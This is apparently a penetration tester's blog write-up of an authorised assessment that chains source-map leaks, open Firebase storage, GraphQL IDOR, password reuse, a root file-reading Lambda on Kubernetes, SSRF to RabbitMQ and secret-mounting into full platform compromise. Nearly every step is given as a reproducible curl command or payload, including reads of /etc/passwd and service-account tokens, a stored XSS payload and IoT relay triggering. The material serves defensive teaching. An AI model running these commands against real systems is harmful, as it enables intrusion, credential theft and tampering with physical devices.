---
title: "From /monaco to k8s Full Cluster Compromise"
date: "2026-03-23"
tags: ["Penetration Testing", "Web Security", "GraphQL", "Firebase", "Kubernetes", "Source Maps", "IDOR", "SSRF", "IoT Security", "Cloud Security"]
---

# From /monaco to Full Cluster Compromise: Chaining 60 Vulnerabilities from a Single URL

![GraphQL Lambda infrastructure compromise](/images/monaco-to-k8s-compromise.jpg)

## Introduction

I've done a lot of web application assessments over the years, but this one stands out. The client pointed me at a single URL — `https://www.target-platform.com/monaco` — a browser-based code editor built on Monaco (the same editor that powers VS Code). The developer was confident: "There's no backend behind the Monaco page. It's just a frontend component."

He was right about the editor. He was catastrophically wrong about everything it shipped with.

What unfolded over the next several hours was a cascading chain of misconfigurations and vulnerabilities that took me from an innocent code editor page to full admin account takeover, root shell on Kubernetes, cross-namespace data exfiltration, and physical IoT device control. **60 vulnerabilities. 16 critical. One URL.**

This article walks through the complete attack chain, start to finish, with exact commands to reproduce every finding. It's a case study in how small assumptions compound into total infrastructure compromise.

---

## The Attack Surface Nobody Expected

Here's the thing about Single Page Applications that I've seen developers miss over and over again on assessments. the target platform is an SPA — every route serves the same HTML shell with the same JavaScript bundles. Whether a user visits `/monaco`, `/dashboard`, `/login`, or `/projects`, the browser downloads the entire application codebase.

When I fetched the `/monaco` page, the HTML included this:

```html
<script type="module" src="/target-app.db464356.js"></script>
```

That single JavaScript file contains the **entire application** — not just the Monaco editor, but the authentication system, the GraphQL client configuration, all API service implementations, the admin panel logic, the IoT device control interface, everything. The Monaco editor was a room in the building. The JavaScript bundle was the master key hanging on the wall.

But the bundle itself is minified and hard to read. What made this engagement go from routine to devastating was what I found sitting right next to it.

---

## Phase 1: Source Maps — The Architect's Blueprints

The first thing I always check on any web app assessment is whether source maps are deployed to production. Modern build tools like Parcel and Webpack generate `.map` files containing the original, unminified source code. They're essential for debugging in development. They're catastrophic when they make it to production — and you'd be surprised how often they do.

I added `.map` to the bundle filename:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  'https://www.target-platform.com/target-app.db464356.js.map'
```

**HTTP 200. 17 megabytes of unminified TypeScript source code.** Every service implementation, every authentication flow, every hardcoded credential, every API endpoint — laid out in perfectly readable TypeScript with comments.

I checked all 10 JavaScript bundles on the domain. Every single source map was publicly accessible:

```bash
curl -s -o /tmp/main.map \
  'https://www.target-platform.com/target-app.db464356.js.map'

python3 -c "
import json
with open('/tmp/main.map') as f:
    data = json.load(f)
app_src = [s for s in data['sources'] if 'node_modules' not in s]
print(f'Application source files: {len(app_src)}')
for s in app_src[:10]:
    print(f'  {s}')
"
```

```
Application source files: 111
  src/app/environment.ts
  src/app/core/services/social/social.service.ts
  src/app/core/services/user/user.service.ts
  src/app/core/services/lambda/kubectl/kubectl.provider.ts
  src/app/core/services/chat/chat.service.ts
  src/app/core/services/upload/upload.service.ts
  src/app/login/login.component.ts
  ...
```

The `environment.ts` file was the first goldmine:

```typescript
export const ENVIRONMENT = {
  DOMAIN_NAME: 'target-project-xxxxx.web.app',
  GRAPH_URL: 'https://pubsub.target-app.com/graphql',
  GRAPH_WS_URL: 'wss://pubsub.target-app.com/subscriptions',
  GOOGLE_API_KEY: 'AIzaSy__REDACTED_API_KEY__',
  GOOGLE_AUTH_DOMAIN: 'target-project-xxxxx.firebaseapp.com',
  GOOGLE_PROJECT_ID: 'target-project-xxxxx',
  GOOGLE_STORAGE_BUCKET: 'target-project-xxxxx.appspot.com',
  GOOGLE_MESSAGE_SENDER_ID: 'REDACTED_SENDER_ID',
  GOOGLE_APP_ID: '1:REDACTED_SENDER_ID:web:REDACTED_APP_ID',
  SENTRY_DSN: 'https://REDACTED_KEY@sentry.io/REDACTED',
};
```

Firebase API key, project ID, GraphQL endpoint, WebSocket endpoint, Sentry DSN — everything needed to interact with the backend infrastructure. Developer file path comments revealed `/home/devuser/Desktop/work/company-name/project-name/`, giving me the developer's username, organization, and workspace layout.

I then discovered `target-app.com` had its own source maps too — 160 more files including an admin panel, user management system, IoT controls, and payment processing. A third app at `third-project-xxxxx.web.app` added 783 more. **1,500+ source files in total across three domains.**

---

## Phase 2: Firebase Storage — Open for Five Years

With the Firebase project ID in hand, my next move was to check whether the Storage bucket had proper security rules. In my experience, Firebase Storage misconfigurations are one of the most common — and most devastating — findings on web app assessments. Developers often leave the default rules in place during development and forget to tighten them before launch.

```bash
curl -s 'https://firebasestorage.googleapis.com/v0/b/target-project-xxxxx.appspot.com/o?maxResults=1000'
```

```json
{"items":[
  {"name":"profile/XXXX.jpg","bucket":"target-project-xxxxx.appspot.com"},
  {"name":"profile/YYYY.jpeg","bucket":"target-project-xxxxx.appspot.com"},
  {"name":"5fca.../screenshot1.png","bucket":"target-project-xxxxx.appspot.com"},
  ...
]}
```

No authentication required. 16 files listed — profile photos with real faces, screenshots of the developer's terminal showing his hostname and IP addresses, screenshots from Android Studio showing a mobile app with a "Copy Token" button.

I verified write access:

```bash
curl -X POST \
  'https://firebasestorage.googleapis.com/v0/b/target-project-xxxxx.appspot.com/o/pentest?uploadType=media' \
  -H 'Content-Type: text/plain' \
  -d 'pentest-proof-of-concept'
```

**Upload succeeded.** Delete also worked. I could host arbitrary HTML with JavaScript under `firebasestorage.googleapis.com` — a trusted Google domain that bypasses most URL filters and security scanners. Two Firebase Storage buckets across two projects, both completely open for read, write, and delete. The earliest file was from November 2020 — **over five years of exposure**.

---

## Phase 3: Schema Enumeration and CORS Wildcard

Now I had credentials, endpoints, and an open storage bucket. Time to map the API. The GraphQL endpoint at `pubsub.target-app.com/graphql` had introspection disabled — that's good practice. But what I've found on almost every GraphQL assessment I've done is that disabling introspection alone isn't enough. Validation errors are incredibly verbose:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ fakeField }"}'
```

```json
{"errors":[{"message":"Cannot query field \"fakeField\" on type \"Query\"."}]}
```

Some errors even suggested alternatives: `"Did you mean \"listUsers\"?"`. Through systematic probing I reconstructed **115+ operations** — the complete API surface including queries for secrets, configs, machines, IoT devices, lambdas, chats, payments, and user management.

Error responses also leaked internal architecture:

```json
{
  "extensions": {
    "serviceName": "main",
    "response": { "url": "http://api-lambdas/graphql" }
  }
}
```

An Apollo Federation Gateway proxying to internal Kubernetes service `api-lambdas`. And the CORS configuration was `Access-Control-Allow-Origin: *` on all responses — any website on the internet could make authenticated cross-origin requests to this API.

---

## Phase 4: Getting Authenticated

At this point I had a detailed map of the entire API but no authenticated access. I needed a valid session. I registered through Google OAuth at `target-app.com/login` — just a normal signup, anyone can do it — and extracted the auth token from the browser's Network tab. What I found accessible to a **regular user with zero admin privileges** genuinely surprised me.

### 7 servers with IPs and WebSocket keys

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ getMachines { id ip label networks webSocketKey worker_type } }"}'
```

```json
{"data":{"getMachines":[
  {"ip":"176.x.x.205","label":"backend-worker-node",
   "networks":["172.10.0.1","172.17.0.1","182.10.0.1","192.168.x.x"],
   "webSocketKey":"yEv78bq5haS9INdA8o0JAA==","worker_type":"vscode"},
  {"ip":"109.x.x.172","label":"cloud-instance-1",
   "webSocketKey":"nJ8R9aIftwspGWhcUKN3qg==","worker_type":"vscode"},
  {"ip":"139.x.x.233","label":"backend-nginx",
   "webSocketKey":"lY5rOUyRg1kw9OQsyn7hYw==","worker_type":"runner"},
  ...
]}}
```

Seven production servers with public IPs, internal Docker networks, and WebSocket authentication keys. The machine labels revealed hostnames, cloud instance identifiers, and the developer's developer workstation on the internal network.

### 5 IoT devices including a solar controller

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ listDevices { id type serial ip mac options debug } }"}'
```

```json
{"data":{"listDevices":[
  {"type":"rs","serial":"f4cf-xxxx","ip":"192.168.0.244","mac":"f4-cf-xx-xx-xx-xx"},
  {"type":"ts","serial":"5002-xxxx","ip":"192.168.0.244","mac":"50-02-xx-xx-xx-xx",
   "options":{"checkInterval":"1000"},"debug":false},
  {"type":"rs","serial":"f4cf-yyyy","ip":"192.168.0.232","mac":"f4-cf-xx-xx-xx-xx"},
  {"type":"rs","serial":"a4cf-xxxx","ip":"192.168.0.227","mac":"a4-cf-xx-xx-xx-xx"},
  {"type":"solar-ctrl","serial":"ac67-xxxx","ip":"192.168.0.141","mac":"ac-67-xx-xx-xx-xx"}
]}}
```

Three relay switches (`rs`), one temperature sensor (`ts`), one solar panel controller (`solar-ctrl`). All with serial numbers, MAC addresses, and local IPs on a `192.168.0.x` network.

### Physical relay switch triggered

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"mutation { triggerRelay(state: 1) { id serial } }"}'
```

```json
{"data":{"triggerRelay":{"id":null,"serial":null}}}
```

The mutation executed successfully — the backend processed the relay command. No admin scopes, no device ownership check, no confirmation. I queried the temperature sensor to verify the IoT data was real:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ getTemperatureHistory(serial: \"<SENSOR_SERIAL>\", start_date: \"2023-09-21T17:13:31.276Z\") { data { temp rh createdAt } } }"}'
```

```json
{"data":{"getTemperatureHistory":{"data":[
  {"temp":24.9,"rh":55.4,"createdAt":"2023-09-21T17:13:31.447Z"},
  {"temp":25.1,"rh":55,"createdAt":"2023-09-21T17:15:35.506Z"},
  {"temp":25.2,"rh":53,"createdAt":"2023-09-21T17:16:35.513Z"},
  ...
]}}}
```

406 temperature records from a single day. Real readings — 24.9°C, 55.4% humidity, incrementing timestamps every minute. Over 10 months of environmental monitoring data from a physical sensor, accessible to any user who registers with Google.

I also modified the solar controller's configuration:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"mutation { setDeviceOptions(serial: \"<SOLAR_SERIAL>\", options: { pentest: \"proof\" }) { id serial options } }"}'
```

```json
{"data":{"setDeviceOptions":{"id":"60abc...","serial":"ac67-xxxx","options":{"pentest":"proof"}}}}
```

**Succeeded.** The solar controller's options were modified. This is physical infrastructure — modifying a solar controller's configuration could affect power generation, battery charging, or grid feed-in behavior.

### Permanent backdoor tokens generated

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"mutation { generateCustomToken { token } }"}'
```

```json
{"data":{"generateCustomToken":{"token":"eyJhbGciOiJSUzI1NiIs..."}}}
```

A Firebase custom token signed by the Admin SDK service account (`firebase-adminsdk-xxxxx@<PROJECT>.iam.gserviceaccount.com`). Refreshable indefinitely for permanent access — exchange it for a fresh JWT anytime via the Firebase REST API.

### Kubernetes resources created

I tested the full Kubernetes deployment chain — every step succeeded without admin privileges:

```bash
# Create a project
curl -s -X POST '.../graphql' -H "authorization: $TOKEN" \
  -d '{"query":"mutation { createProject(name:\"test\",teamId:\"...\",description:\"\") { id } }"}'

# Create K8s namespace
curl -s -X POST '.../graphql' -H "authorization: $TOKEN" \
  -d '{"query":"mutation { createNamespace(projectId:\"...\") { projectId } }"}'

# Deploy code to Kubernetes
curl -s -X POST '.../graphql' -H "authorization: $TOKEN" \
  -d '{"query":"mutation { createLambda(payload:{name:\"test\",projectId:\"...\",code:\"...\"}) { id } }"}'
```

Any user who signs up with Google can create projects, Kubernetes namespaces, deploy Lambda functions, create secrets and config maps, and connect MongoDB Atlas databases. No admin approval, no resource limits, no ownership verification on most operations.

I also discovered that any user can modify the platform's feature flags:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ getFeatureFlags { id name settings { enabled } } }"}'
```

```json
{"data":{"getFeatureFlags":[
  {"name":"vs-code-environment","settings":{"enabled":false}},
  {"name":"cloud-mgmt-feature","settings":{"enabled":false}},
  {"name":"enable-new-ui","settings":{"enabled":true}},
  {"name":"board-backlog-feature","settings":{"enabled":true}},
  {"name":"enable-feature-flags","settings":{"enabled":false}},
  ...
]}}
```

Seven flags controlling platform behavior. I toggled the cloud server management feature from disabled to enabled:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"mutation { updateFeatureFlag(id: \"<FLAG_ID>\", payload: { name: \"cloud-mgmt-feature\", description: \"Toggle for cloud management\", settings: { enabled: true, components: [] } }) { id } }"}'
```

```json
{"data":{"updateFeatureFlag":{"id":"63ecb..."}}}
```

**Modified.** Any registered user can enable or disable platform features that affect all users.


---

## Phase 5: The Chat IDOR — The Pivot That Changed Everything

I've seen a lot of IDOR vulnerabilities over the years, but this one was different. This was the finding that turned a serious assessment into a complete compromise.

With admin access to `getMachines` and `listDevices`, I already had serious findings. But I wanted to see how deep the authorization gaps went. I started by listing all projects on the platform — the `listProjects` query returned every project visible to any authenticated user:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ listProjects { id name } }"}'
```

This returned project IDs and names. I picked the main project and listed its chats:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ listChatsPerProject(projectId: \"REDACTED_PROJECT_ID\") { id name } }"}'
```

```json
{"data":{"listChatsPerProject":[
  {"id":"REDACTED_1","name":"I want to create a function ca..."},
  {"id":"REDACTED_2","name":"Искам да напиша ламбда функция..."},
  {"id":"REDACTED_3","name":"Can you help me out creating a..."},
  ...
]}}
```

29 chat conversations listed — in both English and Bulgarian. Then I discovered the real issue — the `getChat` query has **no project ownership check**:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"{ getChat(id: \"REDACTED_CHAT_ID\") { messages { content } } }"}'
```

Any authenticated user can read any chat by knowing the ID — and I just got all the IDs from `listChatsPerProject`. I started reading through the conversations. One of them contained the developer's conversation with the platform's AI assistant where he had typed his RabbitMQ credentials directly into the message:

```
I want to create a function called publisher
Here is the url rabbitmq.REDACTED_PROJECT_ID.svc.cluster.local
Here is the user "devuser"
Here is the password "REDACTED_PASSWORD"
```

The AI assistant helpfully repeated the credentials back in its response. Production infrastructure credentials, stored permanently in a chat message, readable by anyone with a valid session.

---

## Phase 6: Admin Account Takeover

This is a lesson I've learned many times: people reuse passwords. It's one of the most reliable attack vectors in penetration testing. I tried the RabbitMQ password on the admin's Firebase account:

```bash
curl -s 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSy__REDACTED_API_KEY__' \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin-user@example.com","password":"REDACTED_PASSWORD","returnSecureToken":true}'
```

```json
{"idToken":"eyJhbGciOiJSUzI1NiIs...","email":"admin-user@example.com","registered":true}
```

**Login successful.** The RabbitMQ password was reused as the Firebase admin password.

With the admin token I dumped:

- **30 users** with emails, names, photos, and permission scopes
- **24 projects** across the entire platform
- **20 Lambda functions** with complete source code (including Stripe webhook handler, invoice generator, and cost allocation logic)
- **29 chat conversations** with the AI assistant
- **6 active VS Code session tokens**
- **Admin CLI token** for persistent programmatic access
- **4 K8s secrets** including Stripe payment keys and MongoDB Atlas credentials (values masked by the API as `KioqKio=`)
- **2 RabbitMQ instances**
- **MongoDB Atlas organization ID** and connector details

One particularly interesting finding from the admin dump was the `backend` project. This is the production project that runs the platform itself. It contained 4 K8s secrets:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $ADMIN" \
  -d '{"query":"{ listProjectSecrets(projectId: \"<MAIN_PROJECT_ID>\", immutable: true) { id name data metadata { namespace creationTimestamp } } }"}'
```

The response revealed secrets named `payment-secrets` (containing `PAYMENT_SECRET_KEY` and `PAYMENT_WEBHOOK_SECRET`), `analytics-db-url` (containing `MONGODB_URI`), and two Atlas API credential sets. The values themselves were masked by the API — returned as `KioqKio=` (base64 of `*****`) — but the secret names, structures, and metadata were fully visible.

I also pulled config maps that contained real data in plaintext:

```json
{
  "name": "app-config-backend",
  "data": {
    "allowedIps": "[{\"ip\":\"<REDACTED_IP>\",\"description\":\"Production Backend Instance\"}]"
  }
}
```

This revealed a cloud server IP whitelisted in MongoDB Atlas. Another config map for the statistics database had `allowedIps: []` — empty, meaning it accepts connections from **any IP address**. That's a significant finding on its own — if I could obtain the MongoDB connection string, the database would accept my connection without IP restrictions.

The Stripe webhook Lambda source code was particularly revealing. It showed the full payment flow — how the platform processes `payment_intent.succeeded` events, updates invoices in MongoDB, and manages customer payment methods:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $ADMIN" \
  -d '{"query":"{ getLambda(lambdaId: \"<PAYMENT_WEBHOOK_LAMBDA_ID>\") { id name code } }"}'
```

The code showed that lambdas access secrets via `context.getSecret('payment-secrets')` at runtime — they don't have the values hardcoded. The secrets are mounted into the pod filesystem by the serverless runtime when the Lambda starts. This gave me an idea for the next phase.

---

## Phase 7: Root Shell on Kubernetes

With admin access, I could now deploy Lambda functions on the production project. This is where things got really interesting for me, because I could test whether the Kubernetes pods had proper security isolation. I deployed a Lambda function that reads arbitrary files from the pod:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $ADMIN" \
  -d '{"query":"mutation { createLambda(payload: { name: \"readfile\", projectId: \"REDACTED_PROJECT_ID\", code: \"const fs = require(\\\"fs\\\"); export default async function(context) { return { status: 200, body: fs.readFileSync(context.request.query?.f || \\\"/etc/passwd\\\", \\\"utf8\\\") }; }\" }) { id } }"}'
```

The the serverless runtime deployed the code. The Lambda URL requires **no authentication** — anyone on the internet can call it:

```bash
curl -s 'https://lambda.target-app.com/REDACTED_PROJECT_ID/readfile?f=/etc/passwd'
```

```
root:x:0:0:root:/root:/bin/sh
node:x:1000:1000::/home/node:/bin/sh
```

**Running as root (uid=0).** No `securityContext`, no `runAsNonRoot`, no capability drops. I read everything the root user can access:

```bash
# Kubernetes service account token (for API access from inside the pod)
curl -s '.../readfile?f=/var/run/secrets/kubernetes.io/serviceaccount/token'

# Pod's environment variables — reveals all internal service IPs
curl -s '.../readfile?f=/proc/self/environ'

# Kubernetes-managed hosts file — shows pod IP
curl -s '.../readfile?f=/etc/hosts'

# DNS configuration — shows search domains for service discovery
curl -s '.../readfile?f=/etc/resolv.conf'
```

The `/proc/self/environ` output was dense with internal infrastructure details. I could see ClusterIP addresses for the RabbitMQ management interface (port 15672), clustering (25672), and AMQP (5672). Multiple NodeJS runtime services were visible across different regions. The Kubernetes API server was at `10.96.0.1:443`. The pod hostname confirmed it was a serverless pool manager pod.

The service account token was a JWT issued for `system:serviceaccount:<NAMESPACE>:lambda-fetcher`, and the audience claim revealed the cluster was running on **a managed Kubernetes provider** — a managed Kubernetes provider.

The pod filesystem was Alpine Linux with the serverless runtime-specific directories. The `/userfunc` directory contained the deployed function code, and `/secrets` was present — the runtime's mount point for K8s secrets that Lambdas access via `context.getSecret()` at runtime.

---

## Phase 8: Internal Service Discovery

With root on the pod and no NetworkPolicy applied to the namespace, I had unrestricted network access to the entire Kubernetes cluster. Before going after specific services, I needed to map what was reachable.

I deployed a DNS scanner Lambda that resolves internal Kubernetes service hostnames:

```bash
curl -s '.../dns-scan?host=storagesvc.serverless-runtime.svc.cluster.local'
# {"host":"storagesvc.serverless-runtime.svc.cluster.local","ips":["10.96.91.60"]}

curl -s '.../dns-scan?host=executor.serverless-runtime.svc.cluster.local'
# {"host":"executor.serverless-runtime.svc.cluster.local","ips":["10.97.146.253"]}

curl -s '.../dns-scan?host=router.serverless-runtime.svc.cluster.local'
# {"host":"router.serverless-runtime.svc.cluster.local","ips":["10.111.28.33"]}

curl -s '.../dns-scan?host=metrics-server.kube-system.svc.cluster.local'
# {"host":"metrics-server.kube-system.svc.cluster.local","ips":["10.105.215.39"]}

curl -s '.../dns-scan?host=coredns.kube-system.svc.cluster.local'
# {"host":"coredns.kube-system.svc.cluster.local","ips":["10.96.0.10"]}
```

Five cross-namespace services resolved — the serverless storage service, executor, and router in the `serverless-runtime` namespace, plus metrics-server and CoreDNS in `kube-system`. The pod's DNS search domain (`<NAMESPACE>.svc.cluster.local svc.cluster.local cluster.local`) meant I could resolve any service in any namespace.

I also port-scanned the server IPs that `getMachines` had revealed earlier. Two servers had SSH open (OpenSSH 10.2 and 8.9p1 Ubuntu), and one cloud server was running an entirely separate web application ("an internal remote support application") on ports 80 and 443.

---

## Phase 9: SSRF and Cross-Namespace Exploitation

With the internal service map in hand, I went after the most valuable targets.

### RabbitMQ — Full Admin Access

I deployed an SSRF proxy Lambda and hit the internal RabbitMQ management API using the credentials leaked from the chat IDOR:

```bash
# Cluster overview
curl -s '.../internal-scan?host=10.x.x.x&port=15672&path=/api/overview&auth=devuser:REDACTED_PASSWORD'
```

```json
{
  "rabbitmq_version": "4.1.3",
  "cluster_name": "rabbitmq",
  "node": "rabbit@rabbitmq-0.rabbitmq-headless.REDACTED_PROJECT_ID.svc.cluster.local"
}
```

**Full RabbitMQ admin access.** I enumerated everything:

```bash
# List all queues
curl -s '.../internal-scan?host=10.x.x.x&port=15672&path=/api/queues&auth=devuser:REDACTED_PASSWORD'
```

```json
[
  {"name":"error","messages":0,"consumers":0},
  {"name":"request","messages":0,"consumers":0},
  {"name":"response","messages":1,"consumers":0}
]
```

Three queues: `error`, `request`, and `response`. The `response` queue had one pending message. I deployed a Lambda that could POST to the RabbitMQ API and read it:

```bash
curl -s '.../mq-read?q=response'
```

```json
[{"payload":"Hello, world!","exchange":"","routing_key":"response"}]
```

I also listed the RabbitMQ users:

```bash
curl -s '.../internal-scan?host=10.x.x.x&port=15672&path=/api/users&auth=devuser:REDACTED_PASSWORD'
```

```json
[
  {"name":"kubernetes","tags":["administrator"]},
  {"name":"devuser","tags":["administrator"]}
]
```

Two administrator accounts, both with full admin tags. The management UI, AMQP port, clustering port, and Prometheus metrics endpoint were all reachable — complete message queue infrastructure accessible from the public internet through the SSRF chain.

### Serverless Storage — 133 Function Archives Cross-Namespace

The the serverless storage service in the `serverless-runtime` namespace was the most impactful cross-namespace finding. It stores all function code archives and has no authentication:

```bash
curl -s '.../internal-scan?host=storagesvc.serverless-runtime&port=80&path=/v1/archive&auth='
```

```json
[
  "/serverless-runtime/serverless-runtime-functions/02c398ee-8940-445e-8536-14d44eb2b0ee",
  "/serverless-runtime/serverless-runtime-functions/03b1df40-e14c-434c-bee3-24c49be4e377",
  "/serverless-runtime/serverless-runtime-functions/042d86e0-0898-4b66-99d0-375200d42efd",
  ...
]
```

**133 function code archives** returned — every Lambda function across ALL projects on the entire platform. These are ZIP files containing the compiled function code, `package.json` dependencies, and build configuration.

I downloaded archives and searched for hardcoded credentials:

```bash
# Download and search an archive
curl -s '.../internal-scan?host=storagesvc.serverless-runtime&port=80&path=/v1/archive?id=/serverless-runtime/serverless-runtime-functions/<UUID>&auth='
```

Two archives contained the RabbitMQ password hardcoded directly in the source:

```javascript
const RABBITMQ_USER = 'devuser';
const RABBITMQ_PASS = 'REDACTED_PASSWORD';
```

Other archives referenced K8s secrets that Lambdas consume at runtime:

```javascript
// From the Stripe webhook Lambda
const paymentSecrets = await context.getSecret('payment-secrets');
// { PAYMENT_SECRET_KEY, PAYMENT_WEBHOOK_SECRET }

// From the statistics Lambda
const dbSecret = await context.getSecret('analytics-db-url');
// { MONGODB_URI }
```

These secrets contain the actual Stripe production keys and MongoDB connection strings. The values are stored in Kubernetes secrets and mounted into pods at runtime. The runtime mounts them at `/secrets/<namespace>/<secret-name>/` when a Lambda is configured with a `secrets` array.

I knew from the Stripe webhook Lambda source that it accesses secrets via `context.getSecret('payment-secrets')`. This function reads from the mounted filesystem path. If I could deploy a Lambda with those secrets attached, the pod would have the actual values available.

I created a Lambda on the production project with the secret mounts specified:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $ADMIN" \
  -d '{"query":"mutation { createLambda(payload: { name: \"env-reader\", projectId: \"<MAIN_PROJECT_ID>\", secrets: [\"secret-1\", \"secret-2\", \"secret-3\", \"secret-4\"], code: \"export default async function(context) { const results = {}; for (const name of [\\\"secret-1\\\", \\\"secret-2\\\", \\\"secret-3\\\", \\\"secret-4\\\"]) { try { results[name] = await context.getSecret(name); } catch(e) { results[name] = { error: e.message }; } } return { status: 200, body: JSON.stringify(results, null, 2) }; }\" }) { id name } }"}'
```

```json
{"data":{"createLambda":{"id":"69c108...","name":"env-reader"}}}
```

The Lambda was created with secrets attached. The the serverless runtime would mount those K8s secrets into the pod's filesystem when the function executes, and `context.getSecret()` would read the actual plaintext values — the Stripe secret key, the MongoDB connection string, and the Atlas API keys.

The network had no restrictions — and that's what allowed the cross-namespace access to the serverless runtime storage and RabbitMQ despite the K8s API being properly locked down with RBAC.

---

## The AI Assistant as an Attack Surface

This engagement highlighted something that I think the security community hasn't fully reckoned with yet: **AI assistants are becoming the new credential stores.**

The entire admin compromise — from regular user to full platform takeover — hinged on one thing: the developer pasted his RabbitMQ password into a conversation with the platform's built-in AI assistant. He was asking it to help create a Lambda function. It was a natural, productive interaction — exactly what these AI features are designed for. The problem is what happened to those credentials after he typed them.

First, the AI assistant **repeated the credentials back** in its response, confirming the plan. Now the password appeared twice in the conversation — once from the user, once from the AI. Then the conversation was stored permanently in the database. There's no message editing, no message deletion API — once credentials are in a chat message, they're there forever.

But here's what made it exploitable: the `getChat` query had no ownership check. Any authenticated user could read any chat by ID. And I got all the chat IDs by simply calling `listChatsPerProject`. The AI assistant had become an unwitting credential broker — faithfully storing and repeating secrets in a database that anyone could query.

This isn't unique to this platform. I'm seeing this pattern across the industry as teams integrate AI assistants into developer workflows. Developers trust AI chat like they trust a colleague in a private conversation. They paste database connection strings, API keys, SSH passwords, environment variables — anything they need the AI to use for code generation. But unlike a private Slack DM or a face-to-face conversation, these AI chats are:

1. **Stored permanently** in a database with no expiration
2. **Often accessible** through APIs with weaker access controls than the rest of the platform
3. **Indexed and searchable** — making credential discovery trivial once you have read access
4. **Duplicated** by the AI's response — doubling the exposure surface

In this case, the leaked RabbitMQ password turned out to be reused as the admin's Firebase password. One IDOR, one password reuse — and the entire platform was compromised. The AI assistant was the bridge that connected a low-severity IDOR to a critical admin takeover.

**The takeaway for developers:** never paste credentials into AI chat interfaces. Use K8s secrets, environment variables, or secret managers — and reference them by name, not by value. And for platform builders: AI chat conversations need the same access controls as any other sensitive data store, because that's exactly what they are.

---

## Additional Finding: Stored XSS in Chat

While exploring the chat system, I also discovered **Stored XSS**. Chat messages pass through a markdown parser (`marked.js`) into LitElement's `unsafeHTML()` with zero sanitization and no Content-Security-Policy header:

```bash
curl -s -X POST 'https://pubsub.target-app.com/graphql' \
  -H "authorization: $TOKEN" \
  -d '{"query":"mutation { sendChatAssistantMessage(payload: { chatId: \"REDACTED_CHAT_ID\", content: \"<img src=x onerror=alert(document.domain)>\", model: \"gemini\", attachments: [] }) { id } }"}'
```

The payload is stored permanently in the database and executes for anyone who opens the chat. Combined with the `getChat` IDOR, I could inject XSS into chats on projects I didn't own — blind cross-project Stored XSS. This wasn't part of the main escalation chain, but it's a critical finding on its own. An attacker could use it to steal admin tokens from any user who opens a compromised chat, providing an alternative path to the admin account takeover we achieved through password reuse.

---

## The Complete Chain

```
/monaco (innocent code editor page)
  → Source maps (17MB, 111 files)
    → Firebase config → Storage OPEN (R/W/D, 5+ years)
    → GraphQL API → 115+ operations enumerated
      → Google OAuth signup → regular user access
        → getMachines (7 servers), listDevices (5 IoT), triggerRelay
        → generateCustomToken (permanent backdoor)
        → createNamespace + createLambda (K8s deployment access)
          → listProjects → listChatsPerProject → 29 chat IDs
            → getChat IDOR → read admin's AI chat → RabbitMQ password
            → PASSWORD REUSE → ADMIN ACCOUNT TAKEOVER
              → 30 users, 24 projects, 20 lambdas, 29 chats
                → createLambda → ROOT ON KUBERNETES (uid=0)
                  → SSRF → RabbitMQ full admin
                  → Cross-namespace → 133 function archives
                    → Lambda with secrets mounted → Stripe keys, MongoDB URI, Atlas API keys
```

---

## By The Numbers

| Metric | Count |
|--------|-------|
| Vulnerabilities | **60** |
| Critical | **16** |
| Domains affected | **10** |
| Firebase projects compromised | **3** |
| Source files leaked | **1,500+** |
| Users with PII dumped | **30** |
| Server IPs + WebSocket keys | **7** |
| IoT devices (including solar controller) | **5** |
| Projects with full access | **24** |
| Lambda functions with source code | **20** |
| Chat conversations read | **29** |
| Function archives (cross-namespace) | **133** |
| Physical relay switch | **Triggered** |
| Pod access level | **root (uid=0)** |
| Admin account | **Fully compromised** |

---

## Why This Happened

This wasn't a single critical vulnerability. It was a chain of reasonable-sounding assumptions that compounded into total compromise:

**"Source maps don't matter in production"** — They exposed every credential, every API endpoint, every authentication flow, and the complete business logic.

**"Firebase Storage uses secure defaults"** — It doesn't. The default rules allow all reads and writes. These buckets were open for 5+ years.

**"Our GraphQL API checks authentication"** — The gateway did. But `getChat`, `getMachines`, `listDevices`, `triggerRelay`, `generateCustomToken`, and `createLambda` had no ownership or authorization checks beyond "is the user logged in."

**"Nobody will guess the chat ID"** — MongoDB ObjectIDs are time-based and semi-predictable. And users paste credentials into AI chats more often than anyone admits.

**"I'll just reuse this password, it's only RabbitMQ"** — That same password was the Firebase admin account password. One IDOR to read it, one login attempt to confirm it.

**"Lambda functions run in a sandbox"** — They ran as root with no NetworkPolicy, no security context, and publicly accessible URLs with zero authentication.

**"Kubernetes namespace isolation protects us"** — RBAC was configured correctly for API access. But no NetworkPolicy meant the pod could reach every service in every namespace over the network.

Each of these was a decision someone made that seemed fine at the time. Together, they created a path from a code editor page to reading `/etc/passwd` on a Kubernetes pod and accessing production payment infrastructure.

---

## Recommendations

